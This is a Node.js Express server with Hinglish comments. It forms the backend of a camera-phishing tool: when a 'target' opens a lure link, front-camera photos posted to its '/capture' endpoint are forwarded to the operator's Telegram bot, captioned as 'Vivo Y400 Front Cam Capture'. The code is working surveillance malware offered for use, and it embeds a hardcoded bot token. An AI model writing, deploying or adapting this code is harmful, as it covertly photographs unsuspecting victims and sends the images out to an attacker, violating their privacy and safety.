const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

// 👇👇👇 YAHAN APNI DETAILS DALEIN 👇👇👇
const BOT_TOKEN = '8547611250:AAF3Z0p1GGaXyzfakdT5Mb2WIvr9dVv4g9c'; // @BotFather se milega
const MY_USERNAME = 'Momos_877291_Bot'; // Bina @ ke
// 👆👆👆 YAHAN Khatam 👆👆👆

const bot = new TelegramBot(BOT_TOKEN, {polling: true});
const app = express();

app.use(express.json());
app.use(express.static('public')); // Ye frontend files (index.html) ko serve karega

// Jab target link open karta hai aur photo bhejta hai, ye endpoint receive karega
app.post('/capture', async (req, res) => {
    try {
        const base64Image = req.body.imageData;
        
        // Base64 ko remove karna (data:image/jpeg;base64,)
        const imageBuffer = Buffer.from(base64Image.replace(/^data:image\/jpeg;base64,/u, ""), 'base64');
        
        const filename = `vivo_y400_${Date.now()}.jpg`;
        
        // Temporary file save karein
        fs.writeFileSync(filename, imageBuffer);

        // Telegram Bot ko photo bhejein
        await bot.sendPhoto(MY_USERNAME, {
            source: fs.createReadStream(filename),
            caption: `📸 **Vivo Y400 Front Cam Capture**\nTime: ${new Date().toLocaleString()}`
        });

        // File delete karein (storage bachane ke liye)
        fs.unlinkSync(filename);

        res.json({ success: true, message: "Photo sent to Telegram" });
    } catch (error) {
        console.error("Error sending photo:", error);
        res.status(500).json({ success: false, error: error.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
